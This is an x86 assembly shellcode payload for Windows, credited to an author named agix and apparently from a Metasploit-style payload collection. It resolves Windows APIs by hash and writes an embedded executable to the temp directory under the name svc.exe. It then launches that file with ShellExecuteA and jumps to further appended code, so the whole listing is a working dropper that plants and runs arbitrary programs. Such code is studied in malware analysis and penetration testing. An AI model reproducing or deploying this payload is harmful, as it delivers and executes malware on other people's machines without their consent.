;-----------------------------------------------------------------------------;
; Author: agix (florian.gaultier[at]gmail[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Size: 307 bytes
;-----------------------------------------------------------------------------;

[BITS 32]
; Input: EBP must be the address of 'api_call'.

push 0x006c6c64
push 0x2e32336c
push 0x6c656873
push esp
push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
call ebp               ; LoadLibraryA("shell32.dll");

push byte 127          ; Push down 127
pop eax                ; And pop it into EAX
shl eax, 3             ; Shift EAX left by 3 so it = 1016
sub esp, eax           ; Alloc this space on the stack for the temp file path + name
push esp               ; Push the buffer address
push eax               ; Push the buffer size (127 * 4 = 508)
push 0xE449F330        ; hash( "kernel32.dll", "GetTempPathA" )
call ebp               ; GetTempPathA( 1016, &buffer );
lea eax, [esp+eax]     ; EAX = pointer to the end of the temp path buffer (ESP point to the full path)
mov dword [eax+0], 0x2E637673 ; Append the file name...
mov dword [eax+4], 0x00657865 ; 'svc.exe',0

mov edi, esp           ; to save a few bytes, place the file path pointer in EAX

push byte 0            ; We dont specify a template file handle
push 0x80              ; The Flags and Attributes: FILE_ATTRIBUTE_NORMAL
push byte 2            ; The Creation Disposition: CREATE_ALWAYS
push byte 0            ; We dont specify a SECURITY_ATTRIBUTES structure
push byte 7            ; The Share Mode: FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE
push 0xE0000000        ; The Desired Access: GENERIC_EXECUTE|GENERIC_READ|GENERIC_WRITE
push edi               ; The name of the file to create
push 0x4FDAF6DA        ; hash( "kernel32.dll", "CreateFileA" )
call ebp               ; CreateFileA( ... );
mov ebx, eax           ; EBX = the new file handle

call me_file
me_file:
pop esi
add esi, 0x36          ; esi -> file_content

push byte 0
push esp               ; lpNumberOfBytesWritten
push 0x77777777        ; file_size
push esi
push ebx
push 0x5BAE572D        ; hash( "kernel32.dll", "WriteFile" )
call ebp               ; WriteFile( hFile, pBuffer, len, &out, 0 );

; close the file handle, we dont need to push the handle as it is allready pushed onto stack
push ebx
push 0x528796C6        ; hash( "kernel32.dll", "CloseHandle" )
call ebp               ; CloseHandle( hFile );

push byte 3            ; SW_SHOWMAXIMIZED
push byte 0            ; lpDirectory
push byte 0            ; lpParameters
push edi               ; lpFile
push byte 0            ; lpOperation
push byte 0            ; hwnd
push 0x175AE41D        ; ShellExecuteA
call ebp

add esi, 0x77777777
jmp esi
